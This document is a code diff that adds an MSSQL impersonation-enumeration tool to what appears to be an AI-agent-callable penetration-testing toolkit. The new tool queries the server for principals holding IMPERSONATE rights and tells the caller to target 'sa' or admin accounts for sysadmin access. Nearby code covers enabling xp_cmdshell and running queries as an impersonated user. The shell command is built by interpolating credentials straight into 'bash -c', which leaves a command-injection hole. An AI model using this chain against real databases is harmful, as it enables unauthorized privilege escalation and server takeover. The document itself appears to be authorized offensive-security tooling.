@@ -420,6 +420,79 @@ RECONFIGURE;
             return f"xp_cmdshell enable failed: {e}"
 
     @dn.tool_method
+    def mssql_enum_impersonation(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        domain: str | None = None,
+        windows_auth: bool = True,
+    ) -> str:
+        """
+        Enumerate MSSQL users that can be impersonated for privilege escalation.
+
+        Discovers accounts with IMPERSONATE permission granted, which can be
+        used with mssql_impersonate to escalate privileges. Run this BEFORE
+        attempting impersonation to know which users are valid targets.
+
+        Args:
+            target: MSSQL server IP
+            username: Username for authentication
+            password: Password for authentication
+            domain: Domain for Windows auth (optional)
+            windows_auth: Use Windows authentication
+
+        Returns:
+            List of users that can be impersonated
+
+        Example:
+            >>> mssql_enum_impersonation("192.168.56.22", "user", "pass", "domain.local")
+        """
+        if domain:
+            target_string = f"{domain}/{username}:{password}@{target}"
+        else:
+            target_string = f"{username}:{password}@{target}"
+
+        # nosec B608 - intentional SQL for MSSQL pentest recon
+        sql_query = """
+SELECT DISTINCT b.name AS 'ImpersonatableUser'
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE';
+"""
+        cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
+        if windows_auth:
+            cmd_string += " -windows-auth"
+
+        try:
+            logger.info(f"[*] Enumerating impersonation rights on {target}")
+            stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=120)
+
+            result = stdout + "\n" + (stderr or "")
+
+            # Check if we found impersonatable users
+            if "impersonatableuser" in result.lower() and (
+                "sa" in result.lower() or "admin" in result.lower() or "dbo" in result.lower()
+            ):
+                logger.warning("[!] High-value impersonation targets found!")
+                result = (
+                    "🚨 IMPERSONATION TARGETS FOUND!\n"
+                    "\u2192 Use mssql_impersonate to execute queries as these users\n"
+                    "\u2192 Target 'sa' or admin accounts for sysadmin access\n\n" + result
+                )
+            elif "impersonatableuser" in result.lower():
+                logger.info("[+] Impersonation rights enumerated")
+                result = (
+                    "📋 IMPERSONATION RIGHTS FOUND\n"
+                    "\u2192 Use mssql_impersonate with discovered users\n\n" + result
+                )
+
+            return result
+
+        except Exception as e:
+            return f"Impersonation enumeration failed: {e}"
+
+    @dn.tool_method
     def mssql_impersonate(
         self,
         target: str,
@@ -437,11 +510,13 @@ RECONFIGURE;
         MSSQL allows impersonation if EXECUTE AS permissions are granted.
         Use to escalate from low-privileged SQL login to sysadmin.
 
+        Run mssql_enum_impersonation FIRST to discover valid impersonation targets.
+
         Args:
             target: MSSQL server IP
             username: Current username
             password: Password for authentication
-            impersonate_user: User to impersonate (e.g., 'sa', 'dbo')
+            impersonate_user: User to impersonate (e.g., 'sa', 'dbo') - get from mssql_enum_impersonation
             query: SQL query to execute as impersonated user
             domain: Domain for Windows auth (optional)
             windows_auth: Use Windows authentication
@@ -451,6 +526,7 @@ RECONFIGURE;
             Query result executed as the impersonated user
 
         Example:
+            >>> mssql_enum_impersonation("192.168.56.22", "user", "pass", "domain.local")  # First enumerate
             >>> mssql_impersonate("192.168.56.22", "user", "pass", "sa", "SELECT SYSTEM_USER", "domain.local")
         """
         if domain:
